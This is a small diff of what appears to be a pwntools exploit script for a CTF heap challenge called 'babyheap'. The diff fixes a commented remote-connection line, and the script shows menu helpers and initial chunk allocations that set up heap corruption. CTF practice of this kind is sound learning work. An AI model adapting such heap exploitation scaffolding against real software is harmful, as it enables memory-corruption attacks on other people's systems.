@@ -10,7 +10,7 @@ def delete(index):
         r.sendlineafter('choice: ','3')
         r.sendlineafter('please input chunk index: ',str(index))
 r = process('./babyheap', env={"LD_PRELOAD":"./libc.so.6"})
-#s = remote('babyheap.2018.teamroir.cn',3154)
+#r = remote('babyheap.2018.teamroir.cn',3154)
 libc = ELF('./libc.so.6')
 alloc(0xf0,'A' * 0xf0)#sb1
 alloc(0x70,'A' * 0x70)#fb1
